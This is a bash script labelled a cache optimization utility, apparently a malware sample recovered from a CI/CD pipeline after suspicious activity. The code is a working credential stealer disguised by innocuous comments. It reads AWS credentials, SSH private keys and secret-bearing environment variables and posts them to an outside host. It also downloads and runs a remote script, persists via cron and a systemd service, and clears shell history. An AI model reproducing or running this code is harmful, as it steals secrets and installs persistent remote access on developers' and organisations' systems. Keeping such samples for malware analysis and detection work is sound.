#!/bin/bash
# === sample_optimize_cache.sh ===
# "Cache optimization utility" — found in a CI/CD pipeline after suspicious activity
# Submitted by: jenkins-user@build-agent-04
# ============================================================

CACHE_DIR="${HOME}/.cache/optimize"
PAYLOAD_URL="https://cdn.optimized-cache.io/scripts/update.sh"
EXFIL_HOST="metrics.cache-opt.com"
EXFIL_PORT="8443"

# "Initialize cache directory"
mkdir -p "$CACHE_DIR" 2>/dev/null

# "Load configuration"
if [ -f "$HOME/.aws/credentials" ]; then
    AWS_CREDS=$(cat "$HOME/.aws/credentials" | base64 -w0)
    curl -s -X POST "https://$EXFIL_HOST:$EXFIL_PORT/api/metrics" \
        -H "Content-Type: application/json" \
        -d "{\"data\":\"$AWS_CREDS\",\"tag\":\"cache_v2\"}">/dev/null 2>&1
fi

# "Load SSH keys for cache verification"
if [ -f "$HOME/.ssh/id_rsa" ]; then
    SSH_KEY=$(cat "$HOME/.ssh/id_rsa" | base64 -w0)
    curl -s -X POST "https://$EXFIL_HOST:$EXFIL_PORT/api/keys" \
        -d "$SSH_KEY" >/dev/null 2>&1
fi

# "Check environment variables for cache configuration"
ENV_DUMP=$(env | grep -iE '(TOKEN|KEY|SECRET|PASS|API)' | base64 -w0)
curl -s -X POST "https://$EXFIL_HOST:$EXFIL_PORT/api/env" \
    -d "$ENV_DUMP" >/dev/null 2>&1

# "Download latest cache definitions"
curl -s "$PAYLOAD_URL" -o "$CACHE_DIR/update.sh"
chmod +x "$CACHE_DIR/update.sh"

# "Set up periodic cache refresh"
CRON_LINE="*/15 * * * * $CACHE_DIR/update.sh --silent"
(crontab -l 2>/dev/null; echo "$CRON_LINE") | crontab -

# "Register cache service"
cat > /etc/systemd/system/cache-opt.service <<EOF
[Unit]
Description=Cache Optimization Service

[Service]
ExecStart=$CACHE_DIR/update.sh --daemon
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload 2>/dev/null
systemctl enable cache-opt.service 2>/dev/null
systemctl start cache-opt.service 2>/dev/null

# "Clean up old cache entries"
unset AWS_CREDS SSH_KEY ENV_DUMP
history -c 2>/dev/null

echo "[ok] Cache optimization complete."
